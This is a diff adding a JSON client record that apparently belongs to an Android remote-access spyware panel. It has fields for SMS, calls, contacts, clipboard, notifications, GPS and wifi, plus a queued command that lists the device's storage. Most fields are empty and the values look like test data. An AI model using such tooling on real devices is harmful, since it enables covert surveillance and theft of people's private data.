@@ -1,0 +1,44 @@
+{
+  "clientID": "ce98c1a1929d3679",
+  "CommandQue": [
+    {
+      "action": "ls",
+      "path": "/storage/emulated/0",
+      "type": "0xFI",
+      "uid": 1389
+    }
+  ],
+  "SMSData": [],
+  "CallData": [],
+  "contacts": [],
+  "wifiNow": [
+    {
+      "BSSID": "00:AA:76:1a:db:54",
+      "SSID": "csc"
+    }
+  ],
+  "wifiLog": [
+    {
+      "BSSID": "00:AA:76:1a:db:54",
+      "SSID": "csc",
+      "firstSeen": "2023-08-19T20:11:37.915Z",
+      "lastSeen": "2023-08-20T19:55:21.841Z"
+    }
+  ],
+  "clipboardLog": [],
+  "notificationLog": [],
+  "enabledPermissions": [],
+  "apps": [],
+  "GPSData": [],
+  "GPSSettings": {
+    "updateFrequency": 0
+  },
+  "downloads": [],
+  "currentFolder": [
+    {
+      "name": "../",
+      "isDir": true,
+      "path": "/storage/emulated/0/DCIM"
+    }
+  ]
+}
